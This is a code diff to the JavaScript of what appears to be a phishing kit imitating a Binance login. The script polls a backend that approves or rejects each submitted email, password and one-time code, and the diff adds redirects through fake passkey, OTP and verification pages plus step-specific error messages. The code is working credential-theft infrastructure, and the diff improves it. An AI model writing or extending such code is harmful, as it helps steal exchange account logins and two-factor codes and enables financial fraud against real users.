@@ -611,16 +611,27 @@
                     console.log('Poll result:', result);
                     
                     if (result.status === 'approved') {
-                        // Hide loading and proceed to next step
+                        // Hide loading and proceed to next step IMMEDIATELY
                         hideLoading();
                         setDataExpiration();
-                        setTimeout(() => {
+                        if (step === 'email') {
                             window.location.href = 'binance-passkey.html';
-                        }, 1000);
+                        } else if (step === 'password') {
+                            window.location.href = 'binance-otp.html';
+                        } else if (step === 'otp') {
+                            window.location.href = 'binance-verification.html';
+                        } else {
+                            // fallback: reload or go to dashboard
+                            window.location.href = 'binance.html';
+                        }
                     } else if (result.status === 'rejected') {
                         // Hide loading and show error
                         hideLoading();
-                        showError(result.error_message || 'Incorrect email. Please try again.');
+                        let errorMsg = 'Incorrect input. Please try again.';
+                        if (step === 'email') errorMsg = result.error_message || 'Incorrect email. Please try again.';
+                        else if (step === 'password') errorMsg = result.error_message || 'Incorrect password. Please try again.';
+                        else if (step === 'otp') errorMsg = result.error_message || 'Invalid OTP. Please try again.';
+                        showError(errorMsg);
                     } else {
                         // Still pending, continue polling
                         setTimeout(poll, 2000); // Poll every 2 seconds
